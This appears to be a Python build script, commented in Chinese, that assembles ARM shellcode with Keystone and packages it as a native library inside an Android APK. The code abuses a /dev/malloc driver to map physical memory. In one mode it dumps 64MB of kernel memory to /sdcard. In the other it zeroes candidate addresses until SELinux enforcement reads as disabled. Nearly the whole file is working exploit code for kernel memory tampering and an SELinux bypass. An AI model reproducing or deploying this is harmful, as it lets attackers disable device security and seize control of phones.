#!/usr/bin/env python3
"""一个 so 两种模式（按 /sdcard/wb_targets.bin 是否存在切换）：

  * 不存在 -> DUMP  : 只读 dump 物理 0x20000000..0x24000000 (64MB) 到 /sdcard/wb_kcode.bin
  * 存在   -> BATCH : 从该文件逐个读 4 字节物理地址, 对每个地址
                      保存原值 -> 写 0 -> open(/sys/fs/selinux/enforce) 验证
                      -> 未命中立即写回原值(回滚), 命中则保留 0 并停机
                      结果写 /sdcard/wb_hit.txt : [rc u32][target u32]
                      rc=2 命中, 0/1 未命中, 0xffffffff mmap 失败
"""
import os, zipfile, subprocess
from keystone import *
import build_probe as bp

HERE = os.path.dirname(os.path.abspath(__file__))
STACK = 224
S = {'dump': 64, 'malloc': 96, 'enforce': 128, 'hit': 160, 'targets': 192}


def setup_strings():
    L = ['push {r4, r5, r6, r7, r8, r9, r10, r11, lr}',
         'sub sp, sp, #%d' % STACK]
    for name, s in [('dump', '/sdcard/wb_kcode.bin'),
                    ('malloc', '/dev/malloc'),
                    ('enforce', '/sys/fs/selinux/enforce'),
                    ('hit', '/sdcard/wb_hit.txt'),
                    ('targets', '/sdcard/wb_targets.bin')]:
        off = S[name]
        b = s.encode() + b'\0'
        b += b'\0' * ((4 - len(b) % 4) % 4)
        for i in range(0, len(b), 4):
            w = int.from_bytes(b[i:i+4], 'little')
            L += ['movw r0, #%d' % (w & 0xffff),
                  'movt r0, #%d' % ((w >> 16) & 0xffff),
                  'str r0, [sp, #%d]' % (off + i)]
    return L


def opn(path_off, flags, mode, dst):
    return ['add r0, sp, #%d' % path_off,
            'movw r1, #%d' % flags, 'mov r2, #%d' % mode,
            'mov r7, #5', 'svc 0', 'mov %s, r0' % dst]


def finish():
    return ['done:', 'mov r0, r10', 'mov r7, #6', 'svc 0',
            'movw r0, #6', 'movt r0, #1',
            'add sp, sp, #%d' % STACK,
            'pop {r4, r5, r6, r7, r8, r9, r10, r11, pc}']


def asm():
    L = setup_strings()

    # ---- 模式判定 ----
    L += opn(S['targets'], 0, 0, 'r9')
    L += ['cmp r9, #0', 'blt do_dump']
    L += ['mov r0, r9', 'mov r7, #6', 'svc 0']       # 只用存在性, 立即关掉

    # ================= BATCH =================
    L += opn(S['hit'], 0x241, 420, 'r10')
    L += opn(S['malloc'], 2, 0, 'r11')
    L += opn(S['targets'], 0, 0, 'r9')               # 重新打开读内容

    L += ['tloop:',
          'mov r0, r9', 'add r1, sp, #48', 'mov r2, #4',
          'mov r7, #3', 'svc 0', 'cmp r0, #4', 'bne batch_done',
          'ldr r6, [sp, #48]']                        # r6 = target
    # 16MB 块对齐 (驱动只接受 0x1000000 粒度)
    L += ['movw r0, #0', 'movt r0, #0xfff0', 'and r5, r6, r0',
          'movw r0, #0xffff', 'movt r0, #0x000f', 'and r4, r6, r0',
          'str r4, [sp, #52]',                        # 暂存 off
          'movw r0, #0', 'movt r0, #0x2000',
          'sub r0, r5, r0']                           # r0 = addr
    # struct info: addr=r0, size=0x1000000
    L += ['mov r1, #0',
          'str r1, [sp, #4]', 'str r1, [sp, #12]', 'str r1, [sp, #16]',
          'str r1, [sp, #20]', 'str r1, [sp, #24]', 'str r1, [sp, #28]',
          'str r0, [sp, #0]', 'mov r1, #0x1000000', 'str r1, [sp, #8]']
    L += ['mov r0, r11', 'movw r1, #0x4d04', 'movt r1, #0x8020',
          'mov r2, sp', 'mov r7, #54', 'svc 0']
    L += ['mov r0, #0', 'mov r1, #0x1000000', 'mov r2, #3', 'mov r3, #1',
          'mov r4, r11', 'mov r5, #0', 'mov r7, #192', 'svc 0']
    L += ['movw r1, #0xf000', 'movt r1, #0xffff', 'cmp r0, r1',
          'bhs mapfail', 'mov r5, r0']
    L += ['ldr r4, [sp, #52]', 'add r4, r5, r4']     # r4 = q
    # 保存原值, 写 0
    L += ['ldr r8, [r4]', 'mov r0, #0', 'str r0, [r4]',
          'mov r0, #0', 'str r0, [sp, #32]', 'str r0, [sp, #40]']
    # open selinuxfs
    L += ['add r0, sp, #%d' % S['enforce'], 'mov r1, #0', 'mov r2, #0',
          'mov r7, #5', 'svc 0', 'mov r3, r0', 'cmp r3, #0', 'blt rollback']
    L += ['mov r0, r3', 'add r1, sp, #40', 'mov r2, #1', 'mov r7, #3', 'svc 0',
          'mov r0, r3', 'mov r7, #6', 'svc 0',
          'mov r0, #1', 'str r0, [sp, #32]',
          'ldrb r0, [sp, #40]', 'cmp r0, #0x30', 'bne rollback']
    L += ['mov r0, #2', 'str r0, [sp, #32]', 'str r6, [sp, #36]',
          'mov r0, r10', 'add r1, sp, #32', 'mov r2, #8', 'mov r7, #4', 'svc 0',
          'b done']                                    # 命中: 保留 0
    L += ['rollback:', 'str r8, [r4]']
    L += ['next_t:', 'mov r0, r5', 'mov r1, #0x1000000', 'mov r7, #91', 'svc 0',
          'b tloop']
    L += ['mapfail:', 'b tloop']                      # 单点失败跳过, 不终止
    L += ['batch_done:', 'mov r0, #0', 'str r0, [sp, #32]', 'mvn r0, #0',
          'str r0, [sp, #36]',
          'mov r0, r10', 'add r1, sp, #32', 'mov r2, #8', 'mov r7, #4', 'svc 0',
          'b done']

    # ================= DUMP =================
    L += ['do_dump:']
    L += opn(S['dump'], 0x241, 420, 'r10')
    L += opn(S['malloc'], 2, 0, 'r11')
    L += ['mov r6, #0', 'movw r9, #0', 'movt r9, #0x0400']   # 64MB
    L += ['bus_loop:', 'cmp r6, r9', 'bhs done']
    L += ['mov r0, #0',
          'str r0, [sp, #4]', 'str r0, [sp, #12]', 'str r0, [sp, #16]',
          'str r0, [sp, #20]', 'str r0, [sp, #24]', 'str r0, [sp, #28]',
          'str r6, [sp, #0]', 'mov r0, #0x1000000', 'str r0, [sp, #8]']
    L += ['mov r0, r11', 'movw r1, #0x4d04', 'movt r1, #0x8020',
          'mov r2, sp', 'mov r7, #54', 'svc 0']
    L += ['mov r0, #0', 'mov r1, #0x1000000', 'mov r2, #3', 'mov r3, #1',
          'mov r4, r11', 'mov r5, #0', 'mov r7, #192', 'svc 0']
    L += ['movw r1, #0xf000', 'movt r1, #0xffff', 'cmp r0, r1',
          'bhs next_bus', 'mov r5, r0', 'mov r8, #0']
    L += ['wloop:', 'mov r0, r10', 'add r1, r5, r8', 'mov r2, #0x10000',
          'mov r7, #4', 'svc 0', 'cmp r0, #0', 'ble wdone',
          'add r8, r8, r0', 'cmp r8, #0x1000000', 'blo wloop']
    L += ['wdone:', 'mov r0, r5', 'mov r1, #0x1000000', 'mov r7, #91', 'svc 0']
    L += ['next_bus:', 'add r6, r6, #0x1000000', 'b bus_loop']
    L += finish()
    return '\n'.join(L)


def main():
    src = asm()
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    enc, cnt = ks.asm(src, addr=bp.TEXT_OFF)
    code = bytes(enc)
    print('[asm] %d 条指令, %d 字节 / 可用 %d' % (cnt, len(code), bp.TEXT_END - bp.TEXT_OFF))
    assert code and len(code) <= bp.TEXT_END - bp.TEXT_OFF
    so = bp.build_so(code)
    open(os.path.join(HERE, 'wbinject-unified.so'), 'wb').write(so)
    bp.build_apk(so, os.path.join(HERE, 'wbhost-unified.apk'))


if __name__ == '__main__':
    main()
